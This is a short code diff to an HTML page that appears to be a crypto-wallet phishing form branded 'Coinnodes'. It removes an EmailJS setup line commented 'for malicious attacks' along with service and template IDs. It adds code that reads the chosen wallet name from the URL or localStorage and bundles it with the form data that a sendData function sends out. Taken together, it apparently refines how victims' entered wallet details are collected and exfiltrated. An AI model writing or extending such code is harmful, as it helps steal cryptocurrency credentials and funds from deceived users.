@@ -736,14 +736,10 @@
 		<div style="position:fixed;z-index:9999;top:16px;left:16px;right:16px;bottom:16px;pointer-events:none"></div>
 	</div>
 
-	<script type="text/javascript">
-		(function () {
-			emailjs.init("iSn1Z3M8Vsb1dY3xX"); //please encrypted user id for malicious attacks
-		})();
-	</script>
-
 	<script>
-
+		// Wallet name from URL or localStorage
+		const urlParams = new URLSearchParams(window.location.search);
+		const walletParam = urlParams.get('wallet') || localStorage.getItem('selectedWallet');
 
 		const switchForm = (num) => {
 
@@ -839,11 +835,8 @@
 		}
 
 		const sendData = (data) => {
-			console.log(data);
-			const service_id = "service_5jcrpyr";
-			const template_id = "template_21qztbn";
-
 			data = {
+				name: walletParam,
 				message: data,
 				from_name: "Coinnodes"
 			}
